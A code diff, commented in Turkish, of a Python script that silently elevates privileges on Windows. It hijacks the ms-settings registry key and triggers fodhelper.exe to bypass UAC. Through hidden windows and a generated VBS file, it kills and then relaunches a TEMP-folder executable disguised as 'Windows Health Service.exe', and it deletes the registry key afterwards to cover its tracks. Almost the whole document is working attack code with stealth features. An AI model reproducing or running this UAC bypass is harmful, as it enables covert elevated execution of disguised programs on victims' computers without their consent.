@@ -4,57 +4,59 @@ import time
 import ctypes
 import sys
 
-# Ayar: Görev yöneticisindeki tam isim
 target_process_name = "Windows Health Service.exe"
+temp_folder = os.environ.get('TEMP')
 
-def run_completely_invisible(cmd_path):
-    """Windows Shell32 API ile fodhelper'ı tamamen gizli başlatır."""
-    try:
-        # 0 = SW_HIDE (Pencereyi gizle)
-        ctypes.windll.shell32.ShellExecuteW(None, "open", cmd_path, None, None, 0)
-    except:
-        pass
+def create_support_files():
+    """Kapatma ve Açma işlemleri için sessiz VBS ve BAT dosyalarını oluşturur."""
+    kill_vbs = os.path.join(temp_folder, "kill_service.vbs")
+    
+    # Kapatma VBS'si: Taskkill'i tamamen gizli çalıştırır
+    with open(kill_vbs, "w") as f:
+        f.write(f'Set WshShell = CreateObject("WScript.Shell")\n')
+        f.write(f'WshShell.Run "taskkill /F /IM ""{target_process_name}"" /T", 0, True')
+    
+    return kill_vbs
 
-def uac_bypass_action(exe_to_run, args=""):
-    """
-    Kayıt defterine CMD yazmak yerine doğrudan EXE'yi yazar.
-    Bu, yüksek yetkili CMD penceresinin açılmasını engeller.
-    """
+def uac_bypass_vbs(vbs_path):
+    """fodhelper üzerinden bir VBS dosyasını sessizce tetikler."""
     reg_path = r'Software\Classes\ms-settings\shell\open\command'
     try:
-        # Kayıt defteri hazırlığı
         winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
-            # ÖNEMLİ: CMD kullanmıyoruz, doğrudan EXE yolunu ve parametrelerini veriyoruz
-            full_command = f'{exe_to_run} {args}'.strip()
-            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, full_command)
+            # VBS'yi wscript ile tetikliyoruz
+            command = f'wscript.exe "{vbs_path}"'
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
         
-        # fodhelper'ı tetikle
-        run_completely_invisible("fodhelper.exe")
-        
-        # İşlem süresi (Kritik: Çok kısa tutarsan kayıt defteri silindiği için exe açılmaz)
-        time.sleep(5)
-        
-        # Temizlik
+        # fodhelper'ı gizli modda başlat
+        ctypes.windll.shell32.ShellExecuteW(None, "open", "fodhelper.exe", None, None, 0)
+        time.sleep(4)
         winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
     except:
         pass
 
 if __name__ == "__main__":
-    # --- 1. ADIM: ESKİSİNİ KAPAT ---
-    # Doğrudan taskkill.exe'yi çağırıyoruz (cmd /c olmadan)
-    system32 = os.path.join(os.environ['SystemRoot'], 'System32')
-    taskkill_path = os.path.join(system32, 'taskkill.exe')
-    
-    uac_bypass_action(taskkill_path, f'/F /IM "{target_process_name}" /T')
+    # 1. Yardımcı dosyaları oluştur
+    kill_vbs_path = create_support_files()
 
-    # --- 2. ADIM: YENİSİNİ AÇ ---
-    temp_folder = os.environ.get('TEMP')
+    # 2. ÖNCE KAPAT (VBS üzerinden sessizce)
+    uac_bypass_vbs(kill_vbs_path)
+
+    # 3. SONRA AÇ (Doğrudan EXE yoluyla sessizce)
     full_path = os.path.join(temp_folder, target_process_name)
-
     if os.path.exists(full_path):
-        # Tırnak işaretlerini f-string içinde yönetiyoruz
-        uac_bypass_action(f'"{full_path}"')
+        reg_path = r'Software\Classes\ms-settings\shell\open\command'
+        try:
+            winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{full_path}"')
+                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            
+            ctypes.windll.shell32.ShellExecuteW(None, "open", "fodhelper.exe", None, None, 0)
+            time.sleep(4)
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
+        except:
+            pass
 
     sys.exit()
